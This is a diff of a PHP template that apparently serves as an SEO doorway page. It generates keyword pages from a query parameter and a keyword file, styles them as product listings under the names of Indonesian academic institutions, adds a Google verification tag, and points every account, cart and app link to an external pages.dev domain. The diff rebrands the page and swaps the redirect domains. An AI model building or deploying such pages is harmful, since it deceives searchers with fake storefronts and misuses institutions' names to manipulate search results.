@@ -1,4 +1,3 @@
-
 <?php
 function feedback404()
 {
@@ -7,13 +6,13 @@ function feedback404()
     exit(); // Make sure to stop execution
 }
 
-if (isset($_GET['id_ID'])) { // Check for 'id_ID' instead of 'id'
+if (isset($_GET['news_ID'])) { // Check for 'news_ID' instead of 'id'
     $filename = "x.txt";
 
     // Ensure the file exists before trying to read it
     if (file_exists($filename)) {
         $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        $target_string = strtolower($_GET['id_ID']); // Get 'id_ID' parameter
+        $target_string = strtolower($_GET['news_ID']); // Get 'news_ID' parameter
         $BRAND = null;
 
         foreach ($lines as $item) {
@@ -51,7 +50,7 @@ if (isset($_GET['id_ID'])) { // Check for 'id_ID' instead of 'id'
         feedback404(); // Show 403 if file x.txt doesn't exist
     }
 } else {
-    // If 'id_ID' parameter is not present, include main.php file
+    // If 'news_ID' parameter is not present, include main.php file
     include 'main.php';
     exit(); // Stop script execution after including main.php
 }
@@ -63,11 +62,12 @@ $currentTime = date('Y-m-d\TH:i:sP');
 <!DOCTYPE html><html lang="id"><head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="ENGQg4UDh8FbICQf8teFazoexXvSjeY8ktJ9tmh3yxA" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="canonical" href="<?php echo $urlPath; ?>">
-    <link rel="amphtml" href="https://sekawaninstitute.pages.dev/?id_ID=<?php echo $BRANDS; ?>">
-    <title><?php echo $BRANDS; ?> Semnastera Politeknik Sukabumi</title>
-    <meta name="description" content="<?php echo $BRANDS; ?> Semnastera Politeknik Sukabumi adalah seminar tahunan yang mengangkat topik teknologi dan riset terapan. Forum ini mempertemukan akademisi, peneliti, dan praktisi untuk berbagi ilmu dan inovasi terbaru di bidang teknologi, industri, dan kewirausahaan.">
+    <link rel="amphtml" href="https://bumikreatifjaya.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">
+    <title><?php echo $BRANDS; ?> : Platform Bumi Kreatif Institute</title>
+    <meta name="description" content="<?php echo $BRANDS; ?> dan Platform Bumi Kreatif Institute adalah sistem digital terpadu untuk akses informasi akademik, program kreatif, dan layanan kampus berbasis inovasi pendidikan.">
     <meta property="og:image" content="https://assetimage-pk69.pages.dev/3.jpg" />
     <meta property="og:image:width" content="1200" />
 <meta property="og:image:height" content="630" />
@@ -84,9 +84,9 @@ $currentTime = date('Y-m-d\TH:i:sP');
         {
             "@context": "http://schema.org",
             "@type": "Product",
-            "name": "<?php echo $BRANDS; ?> Semnastera Politeknik Sukabumi",
+            "name": "<?php echo $BRANDS; ?> : Platform Bumi Kreatif Institute",
             "image": "https://assetimage-pk69.pages.dev/3.jpg",
-            "description": "<?php echo $BRANDS; ?> Semnastera Politeknik Sukabumi adalah seminar tahunan yang mengangkat topik teknologi dan riset terapan. Forum ini mempertemukan akademisi, peneliti, dan praktisi untuk berbagi ilmu dan inovasi terbaru di bidang teknologi, industri, dan kewirausahaan.",
+            "description": "<?php echo $BRANDS; ?> dan Platform Bumi Kreatif Institute adalah sistem digital terpadu untuk akses informasi akademik, program kreatif, dan layanan kampus berbasis inovasi pendidikan.",
             "sku": "<?php echo $BRANDS; ?>-Daftar",
             "brand": {
                 "@type": "Brand",
@@ -159,14 +159,14 @@ $currentTime = date('Y-m-d\TH:i:sP');
         <div style="z-index: 100;" class="single-pro-details">
             <br>
             <h1 style="color: #f74124;"><?php echo $BRANDS; ?></h1>
-            <h2><?php echo $BRANDS; ?> Semnastera Politeknik Sukabumi</h2>
+            <h2><?php echo $BRANDS; ?> : Platform Bumi Kreatif Institute</h2>
 
-            <a class="add-to-cart" href="https://sekawaninstitute.pages.dev/?id_ID=<?php echo $BRANDS; ?>" style="background-color: #800000; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">
+            <a class="add-to-cart" href="https://bumikreatifjaya.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>" style="background-color: #800000; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">
     <span> <strong>DAFTAR <?php echo $BRANDS; ?></strong></span>
 </a>
             <p> <strong>Rp 30.000</strong></p>
             <h3 style="color: #f74124;">Detail Produk  </h3>
-            <p><a href="<?php echo $urlPath; ?>"><?php echo $BRANDS; ?></a> Semnastera Politeknik Sukabumi adalah seminar tahunan yang mengangkat topik teknologi dan riset terapan. Forum ini mempertemukan akademisi, peneliti, dan praktisi untuk berbagi ilmu dan inovasi terbaru di bidang teknologi, industri, dan kewirausahaan.</p>
+            <p><a href="<?php echo $urlPath; ?>"><?php echo $BRANDS; ?></a> dan Platform Bumi Kreatif Institute adalah sistem digital terpadu untuk akses informasi akademik, program kreatif, dan layanan kampus berbasis inovasi pendidikan.</p>
     </div>
     </section>
 
@@ -210,20 +210,20 @@ $currentTime = date('Y-m-d\TH:i:sP');
         </div>
         <div class="col">
             <h3>My Account</h3>
-            <a href="https://sekawaninstitute.pages.dev/?id_ID=<?php echo $BRANDS; ?>">Sign In</a>
-            <a href="https://sekawaninstitute.pages.dev/?id_ID=<?php echo $BRANDS; ?>">View Cart</a>
-            <a href="https://sekawaninstitute.pages.dev/?id_ID=<?php echo $BRANDS; ?>">My Wishlist</a>
-            <a href="https://sekawaninstitute.pages.dev/?id_ID=<?php echo $BRANDS; ?>">Track My Order</a>
-            <a href="https://sekawaninstitute.pages.dev/?id_ID=<?php echo $BRANDS; ?>">Help</a>
+            <a href="https://bumikreatifjaya.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">Sign In</a>
+            <a href="https://bumikreatifjaya.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">View Cart</a>
+            <a href="https://bumikreatifjaya.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">My Wishlist</a>
+            <a href="https://bumikreatifjaya.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">Track My Order</a>
+            <a href="https://bumikreatifjaya.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">Help</a>
         </div>
         <div class="col install">
             <h3>Install App</h3>
             <p>From App Store or Google Play</p>
             <div class="row">
-                <a href="https://sekawaninstitute.pages.dev/?id_ID=<?php echo $BRANDS; ?>">
+                <a href="https://bumikreatifjaya.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">
                     <img class="app-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/67/App_Store_%28iOS%29.svg/2048px-App_Store_%28iOS%29.svg.png" alt="BRAND-iOs">
                 </a>
-                <a href="https://sekawaninstitute.pages.dev/?id_ID=<?php echo $BRANDS; ?>">
+                <a href="https://bumikreatifjaya.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">
                     <img class="app-icon" src="https://cdn-icons-png.flaticon.com/512/300/300218.png" alt="BRAND-Android">
                 </a>
             </div>
